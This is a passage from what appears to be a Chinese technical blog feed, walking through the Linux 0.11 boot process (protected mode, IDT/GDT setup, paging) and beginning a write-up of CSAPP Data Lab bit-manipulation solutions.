  .word   0x00eb,0x00eb
  mov al,#0x28        ; start of hardware int&#39;s 2 (0x28)
  out #0xA1,al        ; 设置从芯片起始中断号为 0x28
  .word   0x00eb,0x00eb
  mov al,#0x04        ; 8259-1 is master
  out #0x21,al        ; 这里设置的主从芯片，ICW3 命令字将主芯片的 IR2 连接从芯片的 INT
  .word   0x00eb,0x00eb
  mov al,#0x02        ; 8259-2 is slave
  out #0xA1,al        ; 将从芯片的 INT 连到主芯片的 IR2
  .word   0x00eb,0x00eb
  mov al,#0x01        ; 8086 mode for both
  out #0x21,al
  .word   0x00eb,0x00eb
  out #0xA1,al        ; 向主从芯片发送 ICW4 命令字，进入 8086 模式
  .word   0x00eb,0x00eb
  mov al,#0xFF        ; mask off all interrupts for now
  out #0x21,al
  .word   0x00eb,0x00eb
  out #0xA1,al        ; 屏蔽主从芯片所有中断请求
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里都是对可编程终端控制器 8259 芯片进行的编程，整合了一下中文注释（from &lt;code&gt;github.com/beride/linux0.11-1&lt;/code&gt;）&lt;/p&gt;
&lt;p&gt;前摇很长，但真正的切换只有下面几行&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov ax, #0x0001   ; protected mode (PE) bit
lmsw ax           ; This is it
jmpi 0, 8         ; jmp offset 0 of segment 8 (cs)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;lmsw&lt;/code&gt; 命令将 &lt;code&gt;cr0&lt;/code&gt; 寄存器的末尾（PE）赋值为 &lt;code&gt;ax=1&lt;/code&gt;，这就开启保护模式了&lt;/p&gt;
&lt;p&gt;而这个 &lt;code&gt;jmpi&lt;/code&gt; 命令中过，后面的 &lt;code&gt;8&lt;/code&gt; 表示是段选择子，&lt;code&gt;0&lt;/code&gt; 表示偏移地址，这里的索引方式已经变成了保护模式下的索引方式了，所以根据段选择子的结构，描述符索引为 &lt;code&gt;1&lt;/code&gt;，根据之前对 &lt;code&gt;gdt&lt;/code&gt; 的定义，对应的描述符是&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;.word 0x7FFF  ; 8Mb - limit = 2047
.word 0x0000  ; base address = 0
.word 0x9A00  ; code read/exec
.word 0x00C0  ; granularity=4096, 386
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以这里的段选择子指向的是代码段描述符，段基址为 &lt;code&gt;0&lt;/code&gt;，所以最终结构为跳转到地址为 &lt;code&gt;0&lt;/code&gt; 继续执行&lt;/p&gt;
&lt;p&gt;根据此前的地址设置，&lt;code&gt;0&lt;/code&gt; 这个地址就是 240 个扇区的指令，对应 &lt;code&gt;head.s&lt;/code&gt; 和 &lt;code&gt;main.c&lt;/code&gt; 及其他各模块的操作系统代码&lt;/p&gt;
&lt;p&gt;到这里，就要正式进入操作系统了&lt;/p&gt;
&lt;h2 id=&#34;总算是进入操作系统了-heads&#34;&gt;总算是进入操作系统了 (head.s)&lt;/h2&gt;
&lt;h3 id=&#34;再来一次初始化&#34;&gt;再来一次初始化&lt;/h3&gt;
&lt;p&gt;正经的源码在这里换成了 &lt;code&gt;AT&amp;amp;T&lt;/code&gt; 格式，很烦，还好大佬的文章还是用的 &lt;code&gt;intel&lt;/code&gt; 格式&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;_pg_dir:
_setartup_32:
  mov eax, 0x10
  mov ds, ax
  mov es, ax
  mov fs, ax
  mov gs, ax
  lss esp, _stack_start
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;_pg_dir&lt;/code&gt; 表示页目录，设置分页机制的时候会用到&lt;/p&gt;
&lt;p&gt;将 &lt;code&gt;ds&lt;/code&gt; 到 &lt;code&gt;gs&lt;/code&gt; 四个段寄存器都赋值为 &lt;code&gt;0x10&lt;/code&gt;，按照段选择子，这几个段寄存器都指向了此前 &lt;code&gt;gdt&lt;/code&gt; 中，描述符索引为 &lt;code&gt;2&lt;/code&gt; 的描述符，也就是数据段描述符&lt;/p&gt;
&lt;p&gt;&lt;code&gt;lss&lt;/code&gt; 指令相当于让 &lt;code&gt;ss:esp&lt;/code&gt; 栈顶指针指向 &lt;code&gt;_stack_start&lt;/code&gt;，这在 &lt;code&gt;sched.c&lt;/code&gt; 中定义&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; user_stack[&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];

&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;short&lt;/span&gt; b;
} stack_start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;user_stack[&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;根据这个定义，&lt;code&gt;0x10&lt;/code&gt; 将会赋值给 &lt;code&gt;ss&lt;/code&gt; 寄存器（依然是数据段描述符，基址为 &lt;code&gt;0&lt;/code&gt;），而 &lt;code&gt;user_stack&lt;/code&gt; 的最后一个地址的后一个地址将会赋值给 &lt;code&gt;esp&lt;/code&gt;，所以这个 &lt;code&gt;user_stack&lt;/code&gt; 就是后面用到的栈了&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;call setup_idt
call setup_gdt
mov eax, 0x10
mov ds, ax
mov es, ax
mov fs, ax
mov gs, ax
lss esp, _stack_start
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行了设置 &lt;code&gt;idt&lt;/code&gt; 和 &lt;code&gt;gdt&lt;/code&gt; 的函数后，又把刚才的指令执行了一遍&lt;/p&gt;
&lt;p&gt;这里的 &lt;code&gt;setup_idt&lt;/code&gt; 子程序如下&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;; set up a idt with 256 entries pointint to ignore_int, interrupt gates.
; It then loads idt.
; Everything that wants to install itself in the idt-table may do so themselves.
; Interrupts are enabled elsewhere, when we can be relatively sure everything is ok.
; This routine whil be over-written by the page tables.
setup_idt:
  lea edx, ignore_int
  mov eax, 0x00080000
  mov ax, dx      ; selector = 0x0008 = cs
  mov dx, 0x8E00  ; interrupt gate - dpl=0, present
  lea edi, _idt
  mov ecx, 0x100
  rp_sidt:
    mov [edi], eax
    mov [edi+4], edx
    add edi, 8
    dec ecx
    jne rp_sidt
  lidt fword ptr idt_descr
  ret

idt_descr:
  dw 256 * 8 - 1
  dd _idt

_idt:
  DQ 256 dup(0)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用了一个 &lt;code&gt;0x100&lt;/code&gt; 次的 &lt;code&gt;do while&lt;/code&gt; 循环对 &lt;code&gt;_idt&lt;/code&gt; 进行初始化，每一次循环设置一个中断描述符，值均为 &lt;code&gt;00 00 8E 00 00 08 ignore_int&lt;/code&gt; （地址由高到低），因此所有的 &lt;code&gt;idt&lt;/code&gt; 均指向了 &lt;code&gt;ignore_int&lt;/code&gt; 函数（默认中断函数），后面会逐渐替换&lt;/p&gt;
&lt;p&gt;&lt;code&gt;setup_gdt&lt;/code&gt; 如下&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;setup_gdt:
  lgdt gdt_descr
  ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;比较简单，就是将 &lt;code&gt;gdt_descr&lt;/code&gt; 加载到 &lt;code&gt;gdtr&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;长这样：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gdt_descr:
  .word 256 * 8 - 1         ; so does gdt (not that that&#39;s any
  .long _gdt                ; magic number, but it works for me :^)

  .align 3
_idt:
  .fill 256, 8, 0           ; idt is uninitialized

_gdt:
  .quad 0x0000000000000000  ; NULL descriptor
  .quad 0x00c09a0000000fff  ; 16Mb
  .quad 0x00c0920000000fff  ; 16Mb
  .quad 0x0000000000000000  ; TEMPORARY - don&#39;t use
  .fill 252, 8, 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到，给 &lt;code&gt;idt&lt;/code&gt; 和 &lt;code&gt;gdt&lt;/code&gt; 都预留了 &lt;code&gt;256 * 8&lt;/code&gt; 字节的空间，而 &lt;code&gt;gdt&lt;/code&gt; 的初始值为 &lt;code&gt;NULL descriptor&lt;/code&gt;，共 64 项&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这里重新设置的原因在于此前的内存已经不再使用（可以理解为 &lt;code&gt;setup&lt;/code&gt; 部分占的内存被 free 掉了），后续将用于存放其他内容，因此需要将 &lt;code&gt;idtr&lt;/code&gt; 和 &lt;code&gt;gdtr&lt;/code&gt; 指向这个新的 &lt;code&gt;idt&lt;/code&gt; 和 &lt;code&gt;gdt&lt;/code&gt; 表&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;开启分页机制&#34;&gt;开启分页机制&lt;/h3&gt;
&lt;p&gt;在执行完上面的代码后，是一些简单的检查：&lt;/p&gt;
&lt;p&gt;检查 A20 开启（进入保护模式）&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;1:
  incl eax
  movl 0x000000, eax
  cmpl 0x100000, eax
  je 1b
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;检查芯片设置&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;; 486 should set bit 16, to check for wirte-protect in supervisor mode.
; Then it would be unnecessary with the &amp;quot;verify_area()&amp;quot;-calls.
; 486 users probably want to set the NE (#5) bit also, so as to use int 16 for math errors.
movl eax, cr0         ; check math chip
andl 0x80000011, eax  ; Save PG, ET, PE
orl eax, 2            ; set MP
testl eax, 0x10
jne 1f                ; ET is set - 387 is present
xorl eax, 6           ; else reset MP and set EM
1: 
  movl cr0, eax
  jmp after_page_tables
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在做完基本检查后，将跳转到分页模式&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;after_page_tables:
  pushl 0
  pushl 0
  pushl 0
  pushl L6
  pushl _main             ; 这里的压栈用于后续跳转到 _main
  jmp setup_paging
L6:
  jmp L6

setup_paging:
  movl ecx, 1024 * 5      ; 5 pages - pg_dir+4 page tables
  xorl eax, eax
  xorl edi, edi           ; pg_dir is at 0x000
  cld;rep;stosl
  movl eax, _pg_dir
  movl [_pg_dir]   , pg0+7  ; set present bit/user r/w
  movl [_pg_dir+4] , pg1+7
  movl [_pg_dir+8] , pg2+7
  movl [_pg_dir+12], pg3+7
  movl edi, pg3+4092
  movl eax, 0xfff007  ; 16Mb - 4096 + 7 (r/w user, p)
  std
1:
  stosl               ; fill pages backward - more efficient
  subl eax, 0x1000
  jge 1b
  xorl eax, eax       ; pg_dir is at 0x0000
  movl cr3, eax       ; cr3 - page directory start
  movl eax, cr0
  orl eax, 0x80000000
  movl cr0, eax       ; set paging (PG) bit
  ret                 ; this also flushes prefetch-queue
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开启分页机制的设置在 &lt;code&gt;ret&lt;/code&gt; 前的最后三条指令上，这三条指令的效果就是将 &lt;code&gt;cr0&lt;/code&gt; 的最高位置为 &lt;code&gt;1&lt;/code&gt;，这一位就是 &lt;code&gt;PG&lt;/code&gt; 位，&lt;code&gt;1&lt;/code&gt; 表示开启分页机制&lt;/p&gt;
&lt;p&gt;这个版本的 Linux 只为内存预留了 &lt;code&gt;16 Mb&lt;/code&gt; 的空间，最大地址为 &lt;code&gt;0xFFFFFF&lt;/code&gt;，1 页为 &lt;code&gt;4KB&lt;/code&gt;，1 页表为 1024 页，1页表目录为 1024 页表，因此只需要提供 1 页表目录和 4 页表即可，这也就对应了开头一些指令的含义&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mov ecx, 1024 * 5&lt;/code&gt; 表示总共需要 5 页，而 &lt;code&gt;pg_dir&lt;/code&gt; 就成功与上文 &lt;code&gt;head.s&lt;/code&gt; 开头呼应上了，这个标签就是页表目录，而下面将存放四个页表&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;.org 0x1000 pg0;
.org 0x2000 pg1;
.org 0x3000 pg2;
.org 0x4000 pg3;
.org 0x5000
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以在经过这一步设置后，物理内存的 &lt;code&gt;0x0000-0x5000&lt;/code&gt; 都是分页机制使用的空间了，最后将 &lt;code&gt;cr3&lt;/code&gt; 赋值为 &lt;code&gt;0&lt;/code&gt;，就是指向了 &lt;code&gt;pg_dir&lt;/code&gt; 的地址&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;开启分页机制后，覆盖掉的空间是此前初始化 idt 和 gdt 的代码（占用空间为 &lt;code&gt;0x0000-0x1000&lt;/code&gt;）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;此外，&lt;code&gt;pg?+7&lt;/code&gt; 中，&lt;code&gt;pg?&lt;/code&gt; 部分是地址，因为后三位必须要对其到 &lt;code&gt;0b000&lt;/code&gt;，所以正好用于表示权限，&lt;code&gt;7=0x111&lt;/code&gt; 就表示页存在、用户可读写&lt;/p&gt;
&lt;p&gt;在开启分页模式后，经过此前分段机制计算得到的地址为线性地址，需要再次经过分页机制计算才能得到物理地址：&lt;/p&gt;
&lt;p&gt;前 10 bit 表示页目录项的索引，中间 10 bit 表示页表项的索引，最后 12 bit 表示页内的偏移，先找对应的页目录项，再找页表项，最后加上索引，就得到实际物理地址了&lt;/p&gt;
&lt;h3 id=&#34;跳转到-main&#34;&gt;跳转到 main&lt;/h3&gt;
&lt;p&gt;这里跳转到 main 的方法和 ROP 很类似&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;after_page_tables:
  ...
  pushl _main
  jmp setup_paging

setup_paging:
  ...
  ret   ; ROP to _main
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把 &lt;code&gt;_main&lt;/code&gt; 的地址放到栈顶，然后用 &lt;code&gt;jmp&lt;/code&gt; 指令跳转到另一个子程序，此时对栈本身没有进行改变，而 &lt;code&gt;setup_paging&lt;/code&gt; 作为被 &lt;code&gt;jmp&lt;/code&gt; 执行的程序，最后却 &lt;code&gt;ret&lt;/code&gt; 了，这就相当于执行了一个 &lt;code&gt;pop eip&lt;/code&gt;，结果就是 &lt;code&gt;eip=_main&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;于是接下来就正式开始执行 &lt;code&gt;_main&lt;/code&gt; 函数了&lt;/p&gt;
&lt;p&gt;总结一下此时的内存情况&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+--------------+ &amp;lt;- 0x00000 &amp;lt;- cr3
|    pg_dir    |
|     pg 0     |
|     pg 1     |
|     pg 2     |
|     pg 3     |
+--------------+ &amp;lt;- 0x05000
|              |
|    system    |
| from 6 ~ 246 |
|              |
|     idt      | &amp;lt;- idtr
|     gdt      | &amp;lt;- gdtr
|              |
|              |
|     512K     |
|              |
+--------------+ &amp;lt;- 0x80000
|     ...      |
+--------------+ &amp;lt;- 0x90000
|  Some  Data  |
+--------------+ &amp;lt;- 0x90200
|              |
|   setup.s    |
|              |
+--------------+
|     ...      |
+--------------+
|    Stack     |
+--------------+ &amp;lt;- 0x9FF00
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>CSAPP Labs</title>
        <link>/post/csapp-labs/</link>
        <pubDate>Wed, 12 Oct 2022 00:19:32 +0800</pubDate>
        
        <guid>/post/csapp-labs/</guid>
        <description>&lt;img src="/post/csapp-labs/cover.jpg" alt="Featured image of post CSAPP Labs" /&gt;&lt;h2 id=&#34;lab1-data-lab&#34;&gt;Lab1 Data-lab&lt;/h2&gt;
&lt;h3 id=&#34;bitxor&#34;&gt;bitXor&lt;/h3&gt;
&lt;p&gt;用 &lt;code&gt;~&lt;/code&gt; 和 &lt;code&gt;&amp;amp;&lt;/code&gt; 进行异或运算，简单离散数学&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * bitXor - x^y using only ~ and &amp;amp; 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Example: bitXor(4, 5) = 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ~ &amp;amp;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 14
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bitXor&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; y) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; y) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;(x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;y));
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;tmin&#34;&gt;tmin&lt;/h3&gt;
&lt;p&gt;要求返回补码中最小的整数&lt;/p&gt;
&lt;p&gt;众所周知补码形式下最小数为0x80000000，由于使用的常数不能超过 0xff，所以需要使用左移运算生成&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * tmin - return minimum two&amp;#39;s complement integer 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 4
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tmin&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;istmax&#34;&gt;isTmax&lt;/h3&gt;
&lt;p&gt;判断 x 是否为补码格式下的最大数字&lt;/p&gt;
&lt;p&gt;满足 &lt;code&gt;(~x) ^ (x + 1)&lt;/code&gt; 为 0 的只有 0x7fffffff 和 0xffffffff&lt;/p&gt;
&lt;p&gt;所以需要再用 &lt;code&gt;!!(~x)&lt;/code&gt; 排除一下 0xffffffff&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * isTmax - returns 1 if x is the maximum, two&amp;#39;s complement number,
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *     and 0 otherwise 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ! ~ &amp;amp; ^ | +
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 10
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isTmax&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;((&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;alloddbits&#34;&gt;allOddBits&lt;/h3&gt;
&lt;p&gt;其实就是返回 &lt;code&gt;x &amp;amp; 0xaaaaaaaa == 0xaaaaaaaa&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但由于常数不能超过 0xff，所以可以用右移运算来进行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * allOddBits - return 1 if all odd-numbered bits in word set to 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   where bits are numbered from 0 (least significant) to 31 (most significant)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 12
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;allOddBits&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;;
  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;((x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAA&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAA&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;negate&#34;&gt;negate&lt;/h3&gt;
&lt;p&gt;使用位运算和加法表示 &lt;code&gt;-x&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * negate - return -x 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Example: negate(1) = -1.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 5
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;negate&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;isasciidigit&#34;&gt;isAsciiDigit&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;0x30 - 0x39&lt;/code&gt; 之间的数字返回 1&lt;/p&gt;
&lt;p&gt;根据共同点，先忽略个位，验证是否满足 &lt;code&gt;0x0000003?&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;随后只提取最后一位 &lt;code&gt;x&lt;/code&gt;，判断 &lt;code&gt;x + 6&lt;/code&gt; 后是否超过 &lt;code&gt;0x10&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * isAsciiDigit - return 1 if 0x30 &amp;lt;= x &amp;lt;= 0x39 (ASCII codes for characters &amp;#39;0&amp;#39; to &amp;#39;9&amp;#39;)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Example: isAsciiDigit(0x35) = 1.
